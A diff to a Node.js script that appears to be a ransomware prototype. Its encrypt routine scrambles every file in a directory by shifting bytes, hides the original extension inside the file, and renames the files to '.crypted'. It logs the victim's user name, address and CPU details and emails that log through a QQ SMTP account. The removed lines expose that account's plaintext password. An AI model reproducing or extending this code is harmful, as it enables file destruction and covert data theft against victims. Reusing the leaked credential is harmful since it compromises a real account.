@@ -37,7 +37,7 @@ const cpuModel = os.cpus()[0].model    //获取cpu型号
 const cpuSpeed = os.cpus()[0].speed;    //获取cpu主频
 const cpuInfo = `${cpuModel}_${cpuCoreNumber} core_${cpuSpeed}MHZ`;
 //打印日志模块
-fs.appendFile("log.txt", `${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
+fs.appendFile("log.txt", `\r\n \r\n \r\n \r\n \r\n ${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
     encoding: "utf8"
 }, function () {
     console.log('process.pid-basic',process.pid)
@@ -113,27 +113,27 @@ function encrypt(dst) {
             } else {
                 let promise = new Promise((res)=>{
                     fs.readFile(path.join(dst, files), (err, buffer) => {
-                        //console.log("read",files);
                         if (err) throw err;
                         let buf1 = Buffer.allocUnsafe(buffer.length);
                         for (let i = 0; i < buffer.length; i++) {
-                            buf1[i] = buffer[i] + 5;
+                            buf1[i] = buffer[i] + 5;  //加密文件数据
                         }
-                        fs.writeFile(path.join(dst, files), buf1, function (err) {
-                           // console.log("write",files);
+                        let fileExtname = Buffer.from(path.extname(path.join(dst, files)).slice(1,path.extname(path.join(dst, files)).length));  //slice the ext of file not contains .
+                        let extNameBuffer = Buffer.allocUnsafe(fileExtname.length)
+                        for (let i = 0; i < fileExtname.length; i++) {
+                            extNameBuffer[i] = fileExtname[i] - 5;  //加密后缀名
+                        }
+                        const extLength = extNameBuffer.length; //文件后缀名的长度
+                        const extLengthBuffer = Buffer.from((extLength<<1).toString());
+                        const totalLength = buf1.length + extLength + extLengthBuffer.length;  //文件加后缀名的长度
+                        const buf2 = Buffer.concat([buf1, extNameBuffer,extLengthBuffer], totalLength);  //文件数据+后缀名
+                        fs.writeFile(path.join(dst, files), buf2, function (err) {
                             cryptedFile = `加密的文件${path.join(dst, files)}`;
                             console.log("encrypted files", cryptedFile);
                             if (err) {
                                 throw err
                             }
-                            let fileExtname = Buffer.from(path.extname(path.join(dst, files)).slice(1,path.extname(path.join(dst, files)).length));  //slice the ext of file not contains .
-                            let extNameBuffer = Buffer.allocUnsafe(fileExtname.length)
-                            for (let i = 0; i < fileExtname.length; i++) {
-                                extNameBuffer[i] = fileExtname[i] - 3;
-                            }
-                            let newExtName = extNameBuffer.toString()   //new ext (string)
-                            let fileExtNameString = fileExtname.toString()   //origin ext (string)
-                            let renameFiles = `${path.basename(path.join(dst, files),path.extname(path.join(dst, files)))}${newExtName}` + `.crypted`;  //leave . at path.basename
+                            let renameFiles = `${path.basename(path.join(dst, files),path.extname(path.join(dst, files)))}` + `.crypted`;  //leave . at path.basename
                             console.log("rename",renameFiles);
                             fs.renameSync(path.join(dst, files),`${path.join(dst, renameFiles)}`)  //rename
                             //打印日志模块
@@ -162,7 +162,7 @@ function email(){
             var filePath = path.resolve(log,"log.txt")
             var server 	= emailer.server.connect({
                user:	"863165094@qq.com", 
-               password:"uhggqlyrbjkubdjd", 
+               password:"********", 
                host:	"smtp.qq.com", 
                ssl:		true
             });
